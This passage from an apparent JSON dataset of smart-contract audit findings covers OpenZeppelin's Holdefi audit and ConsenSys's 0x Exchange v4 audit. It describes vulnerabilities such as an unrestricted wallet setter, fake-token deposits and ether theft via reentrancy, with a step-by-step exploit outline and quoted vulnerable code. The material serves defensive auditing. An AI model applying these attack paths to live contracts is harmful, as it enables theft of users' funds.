      "summary": "\nThis bug report concerns two Ethereum smart contracts, `CollateralsWallet` and `Holdefi`, and a function in the `CollateralsWallet` contract called `withdraw`. This function allows the `Holdefi` contract to withdraw a collateral asset, but it relies on the `holdefiContract` storage variable being set first. The problem is that the `setHoldefiContract` function, which is used to set this variable, has no restrictions and can be called by any address. This means that an external actor can set the `holdefiContract` variable after the `CollateralsWallet` contract is created, and then call the `withdraw` function to steal any tokens held by the `CollateralsWallet` contract. \n\nTo fix this issue, the `holdefiContract` variable can be set on the contract creation instead of in a separate function, or the `Ownable` contract can be used to set an owner of the `CollateralsWallet` contract so that only a trusted actor can call the `setHoldefiContract` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10938",
      "title": "[M02] List of markets can endlessly grow",
      "impact": "MEDIUM",
      "content": "In the [`HoldefiSettings` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol), the [`addMarket` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L176) is used to introduce new markets to the system by adding them into the [`marketsAssets` mapping](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L63) and in the [`marketsList` array](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L64).\n\n\nGiven that the owner of the contract can add markets without any limit, and given that the [`removeMarket` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L205) does not remove markets properly, as it was pointed out in the issue *[H02] Markets are not being properly removed from the markets list*, the `marketsList` array can grow endlessly. Then, when the array is iterated through, it would cause an out of gas error, as the loop would be too large to be handled in a single transaction. This would happen in the following scenarios:\n\n\n* When adding a new market, [as the `marketsList` array is iterated](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L190-L195)  to check whether a market already exists, preventing the market to be added\n* When [`clearing debts`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L410-L425) in the [`Holdefi` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol), preventing a borrowers collateral to be liquidated.\n\n\nConsider limiting the size of the `marketsList` array to prevent out of gas errors. In addition to this, when removing a market using the `removeMarket` function, consider not only deactivating it in the `marketsAssets` struct, but also removing it from the `marketsList` array.\n\n\n**Update**: *Not fixed. Holdefis statement for this issue:*\n\n\n\n> We explained it in H02. Your suggestion to remove the market from marketsList not only cant solve the issue but also will damage the platform.\n> \n>",
      "summary": "\nThis bug report is about the [`HoldefiSettings` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol) and the [`addMarket` and `removeMarket` functions](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L176 and #L205). The `addMarket` function adds new markets to the system by adding them into the [`marketsAssets` mapping](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L63) and the [`marketsList` array](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L64). The `removeMarket` function does not remove markets properly as it was pointed out in the issue [H02] Markets are not being properly removed from the markets list. This means the `marketsList` array can grow endlessly, and when the array is iterated through, it would cause an out of gas error as the loop would be too large to be handled in a single transaction. This would happen in the scenarios of adding a new market and clearing debts in the [`Holdefi` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol). To prevent out of gas errors, it is suggested to limit the size of the `marketsList` array and when removing a market, to not only deactivate it in the `marketsAss",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10937",
      "title": "[M01] Owner can overrule pauser actions",
      "impact": "MEDIUM",
      "content": "The [`HoldefiPauser` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol) implements the functionality to pause specific functions at will in case a problem appears in the platform. The only accounts that can perform such task [are the `owner` and the `pauser` accounts](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L29).\n\n\nNevertheless, [the time-off period](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L21) that the pause event has to achieve is modifiable only by the owner by calling [the `setPauseDuration` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L86) and if the owner decides to suppress the duration by setting it as zero, [the `isPause` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L45) will always return `true`, no matter what the pauser account does.\n\n\nConsider setting a minimum duration for the time-off period to prevent that the pauser account loses its powers.",
      "summary": "\nThis bug report is about the HoldefiPauser contract, which enables the owner and pauser accounts to pause certain functions in the platform. The time-off period for the pause event is only modifiable by the owner by calling the setPauseDuration function. The problem is that if the owner sets the duration to zero, the isPause function will always return true, regardless of what the pauser account does. This means that the pauser account will lose its powers. The bug report suggests that a minimum duration should be set for the time-off period to prevent this from happening.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10936",
      "title": "[H03] Users can add non-existent ERC20 tokens into the promotion reserve",
      "impact": "HIGH",
      "content": "The [`Holdefi` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol) implements most of the functionalities of the Holdefis protocol, such as [the supply of assets](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L160-L181) into the system, [add collateral](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L234-L258), and to [borrow other assets](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L298) based on the collateral power that the account has, among others.\n\n\nIn particular, [the `depositPromotionReserve` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L741), allows any account to deposit ERC20 token assets into [the promotion reserve](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L57) for a particular market.\n\n\nThe problem is that [the `depositPromotionReserve` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L741) does not check whether the market that the caller is trying to interact with is actually whitelisted by checking [the `isActive` flag](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L43) which enables the possibility to pass any address (except the zero address) as a possible market.\n\n\nHere, an attacker could create a new contract that implements a simple `transferFrom` function that always returns `true`, so [the requirement that checks the output of the real `transferFrom` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L746) can be bypassed. By doing this, the attacker would be calling [the `depositPromotionReserveInternal` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L715) with a fake market address and number of tokens.\n\n\nThis last function will later call several other functions from the same and other contracts, such as [the `getCurrentPromotion` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L525) and [the `getInterests` function from the `HoldefiSettings` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L100), but because the code also abuses the default zero values in several parts, all checks will be bypassed, including the protections that the usage of [the `SafeMath` library](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/SafeMath.sol) provides, ending up in [writing in storage](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L733-L737) not only a fake deposited value of the particular ERC20 token market but also it will update the timestamp from when the inexistent assets were deposited, emulating the behavior of a real ERC20 token.\n\n\nConsider restricting the call to the whitelisted markets by using the already implemented [`isActive` flag](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L43), and restricting who is able to deposit ERC20 assets into the promotion reserve.\n\n\n**Update**: *Not fixed. Holdefis statement for this issue:*\n\n\n\n> You have 2 suggestions for this issue: 1-implementing isActive flag 2-restricting who is able to deposit ERC20 assets first suggestion is good and we will implement it. But restricting users to deposit into promotion reserve will not change anything. Users can deposit their assets into promotion reserve and its good for us. Also updating indexes is not bad for the protocol.\n> \n>",
      "summary": "\nThe Holdefi contract is a protocol that allows users to supply assets, add collateral, and borrow other assets based on the collateral power of their account. The depositPromotionReserve function allows any account to deposit ERC20 token assets into the promotion reserve for a particular market. However, the function does not check whether the market the caller is trying to interact with is whitelisted by checking the isActive flag, which enables the possibility to pass any address (except the zero address) as a possible market. This means an attacker could create a new contract that implements a simple transferFrom function that always returns true, bypassing the requirement that checks the output of the real transferFrom function. This would allow the attacker to call the depositPromotionReserveInternal function with a fake market address and number of tokens.\n\nThe suggested solutions to this bug are to restrict the call to the whitelisted markets by using the already implemented isActive flag, and to restrict who is able to deposit ERC20 assets into the promotion reserve. Holdefi has stated that they will implement the first suggestion, but that restricting users to deposit into the promotion reserve will not change anything. They also state that updating indexes is not bad for the protocol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10935",
      "title": "[H02] Markets are not being properly removed from the markets list",
      "impact": "HIGH",
      "content": "In the [`HoldefiSettings` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol) there are two data structures to track markets: [`marketsList`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L64) which is an array of addresses, and [`marketAssets`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L63), which is a mapping that describes the properties of each market. Additionally, there are two functions to manipulate these markets: [the `addMarket` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L176) which adds new markets, and [the `removeMarket` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L205) which removes an already existent market.\n\n\nThe problem resides in that [the `removeMarket` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L205) does not remove a market from both mentioned data structures, as it only sets a given market as not active in [the `Market` struct](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L42), but does not remove it from the [`marketsList` array](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L64). This means that, when the [`getMarketsList`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L115) function is called, it will list already removed markets, showing them as valid and active markets.\n\n\nThis could lead into [an undesired manipulation of collaterals of a borrower in a specific market](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L415-L424), that could [generate market debts for inactive collaterals in that market](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L422), and could trigger other operations such as [updating the promotion reserve and therefore update a markets supply index](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L420) for a specific collateral in an inactive market. Also, this behavior of having a removed market that is still active could be confusing for the end-users.\n\n\nConsider renaming the `removeMarket` function to `deactivateMarket`, to make its behavior clear. On all the functions that query `marketsList` consider checking if the market is inactive. If the function supports or requires to take into account inactive markets, consider clearly documenting this.\n\n\nAlternatively, consider using different state variables to differentiate from active and inactive markets, instead of leaving them in a state that is not clearly defined.\n\n\n***Update:** Not fixed. Holdefis statement for this issue:*\n\n\n\n> We calculate the borrow-value of each account in getAccountTotalBorrowValue function. This function is using marketsList for calculating the borrow-value. If we remove a market from marketList, the borrow-value of that token for the users that borrowed it, will not be calculated.  \n> \n> We did not remove the market from marketList with awareness.  \n> \n> Actually removing market or collateral in Holdefi stops users from depositing new tokens to contract but withdrawing and other functionalities are not changed because we dont want our users losing their tokens.  \n> \n> Also updating the supply index and promotion reserve doesnt have any bad effect on the platform and these functions are not sensitive operations. They just update index or reserve till current time.  \n> \n> You suggested that we should check whether a market is active or not in the clearDebts. But if we do that, the platform will have problems and we will not consider the users that borrowed that market before.\n> \n> \n\n\n*We have updated our suggestions to make them clearer.*",
      "summary": "\nThis bug report is regarding the HoldefiSettings contract in the Holdefi repository. This contract has two data structures, marketsList and marketAssets, which track markets and their properties, respectively. The bug is that the removeMarket function does not remove a market from both the data structures, only setting it as not active in the Market struct. This can lead to undesired manipulation of collaterals of a borrower in a specific market, generating market debts for inactive collaterals in that market, and updating the promotion reserve and therefore update a markets supply index for a specific collateral in an inactive market. It can also be confusing for the end-users.\n\nThe suggested solutions for this bug are to rename the removeMarket function to deactivateMarket, to make its behavior clear. On all the functions that query marketsList, consider checking if the market is inactive. If the function supports or requires to take into account inactive markets, consider clearly documenting this. Alternatively, consider using different state variables to differentiate from active and inactive markets, instead of leaving them in a state that is not clearly defined.\n\nHoldefis statement for this issue is that they calculate the borrow-value of each account in the getAccountTotalBorrowValue function, which uses marketsList for calculation. Removing a market from this list would mean that the borrow-value of that token for the users that borrowed it, will not be calculated. They also mentioned that updating the supply index and promotion reserve does not have any bad effect on the platform, and that they do not want their users to lose their tokens. They suggested that if they check whether a market is active or not in the clearDebts function, the platform will have problems and they will not consider the users that borrowed that market before.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10934",
      "title": "[H01] Owner can bypass time checks in markets and collateral assets",
      "impact": "HIGH",
      "content": "The [`HoldefiSettings` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol) is in charge of managing some of the most important actions that the admin of the system can perform, such as [add and remove markets](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L176-L208), [add and remove collateral assets](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L211-L234), [set a borrow rate](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L135-L153) and [set a suppliers share rate](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L156-L165) for a given market, and finally [set the value to loan rate](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L237-L253), [set the penalty rate](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L256-L273) and [set a bonus rate](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L276-L284) for a particular collateral asset.\n\n\nBecause these actions are critical in the financial behavior of the project, [this contract inherits functionalities from the `Ownable` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L17), and all these mentioned functions are guarded by [the `onlyOwner` modifier](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol#L20) so the owner is the only one that can modify the systems attributes, and add or remove assets from the project.\n\n\nAlso, because quick changes in the parameters may harm users while using the system, there is a [time-off period](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L23) in which the owner [cannot increase its values](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L141) for a particular market or collateral.\n\n\nNevertheless, there is a feasible scenario where the owner can easily bypass this process by removing and re-adding an already existent market or collateral. For instance, given a specific market, the owner can call [the `removeMarket` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L205), which will only set [the respective `isActive` flag for that market](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L206) as false, and then call [the `addMarket` function for that same market](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L176) but with some new parameters that the owner may use for their own benefit.\n\n\nAdditionally, if these two calls are done in order using a high gas price and the first one with an even higher value, and then these frontrun a users transaction performed to the [`Holdefi` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol), the owner could potentially benefit from these modifications even in the short term.\n\n\nThis same procedure also applies similarly to the analogous [`addCollateral`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L211) and [`removeCollateral`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L231) functions that modify the parameters of the whitelisted collaterals.\n\n\nConsider adding a time check to apply the same logic of the time-off period to a previously removed market or collateral so the owner cannot bypass the time restrictions while changing the parameters.",
      "summary": "\nThe HoldefiSettings contract is responsible for managing some of the most important actions that the admin of the system can perform, such as adding and removing markets, adding and removing collateral assets, setting a borrow rate, setting a suppliers share rate for a given market, and setting the value to loan rate, penalty rate, and bonus rate for a particular collateral asset. \n\nTo ensure that only the owner can make changes to the system's attributes, the contract is designed to inherit functionalities from the Ownable contract, and all functions are guarded by the onlyOwner modifier. \n\nIn order to prevent quick changes in the parameters from harming users, there is a time-off period in which the owner cannot increase its values for a particular market or collateral. However, the owner can bypass this process by removing and re-adding an already existent market or collateral. \n\nTherefore, it is suggested to add a time check to apply the same logic of the time-off period to a previously removed market or collateral, so the owner cannot bypass the time restrictions while changing the parameters.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "13580",
      "title": "Rollback functionality can lead to untested combinations Acknowledged",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFrom the client team:\n\n\n\n> \n> Just like our migrations, we batch our rollbacks by release, which enforces rolling back to known good configurations.\n> \n> \n> \n\n\nThe documentation now includes an [emergency playbook](https://0xprotocol.readthedocs.io/en/latest/additional/emergency.html) that describes how rollbacks should be done.\n\n\n\n\n#### Description\n\n\n`SimpleFunctionRegistry` maps individual function selectors to implementation contracts. As features are newly deployed or upgraded, functions are registered in logical groups after a timelock enforced by the owning multisig wallet. This gives users time to evaluate upcoming changes and stop using the contract if they dont like the changes.\n\n\nOnce deployed, however, any function can individually be rolled back *without* a timelock to any previous version of that function. Users are given no warning, functions can be rolled back to any previous implementation (regardless of how old), and the per-function granularity means that the configuration after rollback may be a never-before-seen combination of functions.\n\n\nThe combinatorics makes it impossible for a user (or auditor) to be comfortable with all the possible outcomes of rollbacks. If there are `n` versions each of `m` functions, there are `n^m` combinations that could be in effect at any moment. Some functions depend on other `onlySelf` functions, so the behavior of those combinations is not at all obvious.\n\n\nThis presents a trust problem for users.\n\n\n#### Recommendation\n\n\nRollback makes sense as a way to rapidly recover from a bad deployment, but we recommend limiting its scope. The following ideas are in preferred order (our favorite first):\n\n\n* Disallow rollback altogether except to an implementation of `address(0)`. This way broken functionality can be immediately *disabled*, but no old version of a function can be reinstated.\n* Limit rollback by number of versions, e.g. only allowing rollback to the immediately previous version of a function.\n* Limit rollback by time, e.g. only allowing rollback to versions in the past *n* weeks.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "0x Exchange v4",
      "source_link": "https://consensys.net/diligence/audits/2020/12/0x-exchange-v4/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Nicholas Ward",
        "Steve Marx"
      ]
    },
    {
      "id": "13579",
      "title": "UniswapFeature: Unchecked returndatasize in low-level external calls Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThis is fixed in [0xProject/[emailprotected]`437a3b0`](https://github.com/0xProject/protocol/commit/437a3b048d2ca0b489fe581acd2b4578c7a557f8).\n\n\n#### Description\n\n\n`UniswapFeature` makes a number of external calls from low-level assembly code. Two of these calls rely on the `CALL` opcode to copy the returndata to memory without checking that the call returned the expected amount of data. Because the `CALL` opcode does not zero memory if the call returns less data than expected, this can lead to usage of dirty memory under the assumption that it is data returned from the most recent call.\n\n\n#### Examples\n\n\n* Call to `UniswapV2Pair.getReserves()`\n\n\n**code/contracts/zero-ex/contracts/src/features/UniswapFeature.sol:L201-L205**\n\n\n\n```\n// Call pair.getReserves(), store the results at `0xC00`\nmstore(0xB00, UNISWAP\\_PAIR\\_RESERVES\\_CALL\\_SELECTOR\\_32)\nif iszero(staticcall(gas(), pair, 0xB00, 0x4, 0xC00, 0x40)) {\n    bubbleRevert()\n}\n\n```\n* Call to `ERC20.allowance()`\n\n\n**code/contracts/zero-ex/contracts/src/features/UniswapFeature.sol:L372-L377**\n\n\n\n```\n// Check if we have enough direct allowance by calling\n// `token.allowance()``\nmstore(0xB00, ALLOWANCE\\_CALL\\_SELECTOR\\_32)\nmstore(0xB04, caller())\nmstore(0xB24, address())\nlet success := call(gas(), token, 0, 0xB00, 0x44, 0xC00, 0x20)\n\n```\n#### Recommendation\n\n\nInstead of providing a memory range for `call()` to write returndata to, explicitly check `returndatasize()` after the call is made and then copy the data into memory using `returndatacopy()`.\n\n\n\n```\nif lt(returndatasize(), EXPECTED\\_SIZE) {\n    revert(0, 0) \n}\nreturndatacopy(0xC00, 0x00, EXPECTED\\_SIZE)\n\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "0x Exchange v4",
      "source_link": "https://consensys.net/diligence/audits/2020/12/0x-exchange-v4/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Nicholas Ward",
        "Steve Marx"
      ]
    },
    {
      "id": "13578",
      "title": "UniswapFeature: Non-static call to ERC20.allowance() Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThis is fixed in [0xProject/[emailprotected]`437a3b0`](https://github.com/0xProject/protocol/commit/437a3b048d2ca0b489fe581acd2b4578c7a557f8).\n\n\n#### Description\n\n\nIn the case where a token is possibly greedy (consumes all gas on failure), `UniswapFeature` makes a call to the tokens `allowance()` function to check whether the user has provided a token allowance to the protocol proxy or to the `AllowanceTarget`. This call is made using `call()`, potentially allowing state-changing operations to take place before control of the execution returns to `UniswapFeature`.\n\n\n**code/contracts/zero-ex/contracts/src/features/UniswapFeature.sol:L373-L377**\n\n\n\n```\n// `token.allowance()``\nmstore(0xB00, ALLOWANCE\\_CALL\\_SELECTOR\\_32)\nmstore(0xB04, caller())\nmstore(0xB24, address())\nlet success := call(gas(), token, 0, 0xB00, 0x44, 0xC00, 0x20)\n\n```\n#### Recommendation\n\n\nReplace the `call()` with a `staticcall()`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "0x Exchange v4",
      "source_link": "https://consensys.net/diligence/audits/2020/12/0x-exchange-v4/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Nicholas Ward",
        "Steve Marx"
      ]
    },
    {
      "id": "13577",
      "title": "Ether temporarily held during transactions can be stolen via reentrancy Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThis is addressed in [0xProject/[emailprotected]`437a3b0`](https://github.com/0xProject/protocol/commit/437a3b048d2ca0b489fe581acd2b4578c7a557f8) by transferring exactly `msg.value` in `sellToLiquidityProvider()`. This adequately protects against this specific vulnerability.\n\n\nThe client team decided to leave the accounting in `MetaTransactionsFeature` as-is due to the complexity/expense of tracking ether consumption more strictly.\n\n\n\n\n#### Description\n\n\nThe exchange proxy typically holds no ether balance, but it can temporarily hold a balance *during* a transaction. This balance is vulnerable to theft if the following conditions are met:\n\n\n1. No check at the end of the transaction reverts if ether goes missing,\n2. reentrancy is possible during the transaction, and\n3. a mechanism exists to spend ether held by the exchange proxy.\n\n\nWe found one example where these conditions are met, but its possible that more exist.\n\n\n#### Example\n\n\n[`MetaTransactionsFeature.executeMetaTransaction()`](https://github.com/0xProject/protocol/blob/475b608338561a1dce3199bfb9fb59ee9372149b/contracts/zero-ex/contracts/src/features/MetaTransactionsFeature.sol#L137) accepts ether, which is used to pay protocol fees. Its possible for less than the full amount in `msg.value` to be consumed, which is why the function uses the `refundsAttachedEth` modifier to return any remaining ether to the caller:\n\n\n**code/contracts/zero-ex/contracts/src/features/MetaTransactionsFeature.sol:L98-L106**\n\n\n\n```\n/// @dev Refunds up to `msg.value` leftover ETH at the end of the call.\nmodifier refundsAttachedEth() {\n    \\_;\n    uint256 remainingBalance =\n        LibSafeMathV06.min256(msg.value, address(this).balance);\n    if (remainingBalance > 0) {\n        msg.sender.transfer(remainingBalance);\n    }\n}\n\n```\nNotice that this modifier just returns the remaining ether balance (up to `msg.value`). It does not check for a specific amount of remaining ether. This meets condition (1) above.\n\n\nIts impossible to reenter the system with a second metatransaction because `executeMetaTransaction()` uses the modifier `nonReentrant`, but theres nothing preventing reentrancy via a different feature. We can achieve reentrancy by trading a token that uses callbacks (e.g. ERC777s hooks) during transfers. This meets condition (2).\n\n\nTo find a full exploit, we also need a way to extract the ether held by the exchange proxy. [`LiquidityProviderFeature.sellToLiquidityProvider()`](https://github.com/0xProject/protocol/blob/475b608338561a1dce3199bfb9fb59ee9372149b/contracts/zero-ex/contracts/src/features/LiquidityProviderFeature.sol#L96) provides such a mechanism. By passing `ETH_TOKEN_ADDRESS` as the `inputToken` and an address in the attackers control as the `provider`, an attacker can transfer out any ether held by the exchange proxy. Note that `sellToLiquidityProvider()` can transfer any amount of ether, not limited to the amount sent via `msg.value`:\n\n\n**code/contracts/zero-ex/contracts/src/features/LiquidityProviderFeature.sol:L114-L115**\n\n\n\n```\nif (inputToken == ETH\\_TOKEN\\_ADDRESS) {\n    provider.transfer(sellAmount);\n\n```\nThis meets condition (3).\n\n\nThe full steps to exploit this vulnerability are as follows:\n\n\n1. A maker/attacker signs a trade where one of the tokens will invoke a callback during the trade.\n2. A taker signs a metatransaction to take this trade.\n3. A relayer sends in the metatransaction, providing more ether than is necessary to pay the protocol fee. (Its unclear how likely this situation is.)\n4. During the token callback, the attacker invokes `LiquidityProviderFeature.sellToLiquidityProvider()` to transfer the excess ether to their account.\n5. The metatransaction feature returns the remaining ether balance, which is now zero.\n\n\n#### Recommendation\n\n\nIn general, we recommend using strict accounting of ether throughout the system. If theres ever a temporary balance, it should be accurately resolved at the end of the transaction, after any potential reentrancy opportunities.\n\n\nFor the example we specifically found, we recommend doing strict accounting in the metatransactions feature. This means features called via a metatransaction would need to return how much ether was consumed. The 